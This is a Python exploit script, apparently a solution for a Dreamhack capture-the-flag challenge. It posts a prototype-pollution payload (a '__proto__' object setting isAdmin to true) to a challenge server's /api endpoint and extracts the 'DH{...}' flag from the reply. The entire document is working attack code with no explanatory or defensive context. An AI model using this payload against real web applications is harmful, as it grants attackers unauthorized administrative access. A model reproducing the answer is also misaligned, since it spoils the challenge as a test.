import requests
import json
import re
class Exploit:
    def __init__(self, baseURL):
        self.baseUrl = baseURL
    
    def post_api_info(self):
        payload = json.dumps({
            "__proto__": {"isAdmin": True},
            "path": "/admin",
            "method": "GET"
        })
        response = requests.post(f"{self.baseUrl}/api", data={"api_info": payload})
        if response.status_code == 200:
            print(f"[+] Attacker Prototype SuccessFully")
            match = re.search(r"DH\{.*?\}", response.text)
            if match:
                print(f"[+] Flag Here:\n{match.group(0)}")
            else:
                print(f"[-] Try Again!")
        else:
            print(f"[-] Failed Try Again")

if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:22921"
    exploit = Exploit(BASE_URL)
    exploit.post_api_info()
